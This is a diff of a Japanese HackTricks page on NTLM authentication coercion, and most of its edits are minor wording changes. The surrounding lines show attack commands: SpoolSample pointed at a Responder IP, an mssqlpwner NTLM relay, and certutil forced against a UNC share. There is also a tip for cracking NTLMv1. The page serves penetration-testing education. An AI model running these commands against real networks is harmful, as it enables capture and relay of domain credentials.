@@ -21,8 +21,8 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 
 ## Spooler Service Abuse
 
-_**Print Spooler**_ サービスが**有効**な場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を任意のシステムに送信するように指示**できます。\
-プリンターが任意のシステムに通知を送信する際には、その**システムに対して認証する必要があります**。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証には**コンピュータアカウント**が使用されます。
+_**Print Spooler**_ サービスが**有効**になっている場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、通知を**任意のシステムに送信するように指示**できます。\
+プリンターが任意のシステムに通知を送信する際には、その**システムに対して認証**する必要があります。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では**コンピュータアカウント**が使用されます。
 
 ### Finding Windows Servers on the domain
 
@@ -43,7 +43,7 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
 ### サービスに任意のホストに対して認証を要求させる
 
-[**ここからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+[ **ここからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -89,11 +89,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-または、この別の技術を使用します: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-certutil.exe lolbin（Microsoft署名のバイナリ）を使用してNTLM認証を強制することが可能です:
+certutil.exe lolbin（Microsoft署名のバイナリ）を使用してNTLM認証を強制することが可能です：
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -116,11 +116,11 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ## NTLMv1のクラッキング
 
 [NTLMv1チャレンジをキャプチャできる場合は、ここでそれをクラッキングする方法を読んでください](../ntlm/#ntlmv1-attack)。\
-&#xNAN;_&#x52;NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_
+&#xNAN;_&#x52;NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があることを忘れないでください_
 
 {% hint style="success" %}
-AWSハッキングを学び、練習する：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、練習する：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、練習する:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -128,7 +128,7 @@ GCPハッキングを学び、練習する：<img src="../../.gitbook/assets/grt
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
 {% endhint %}
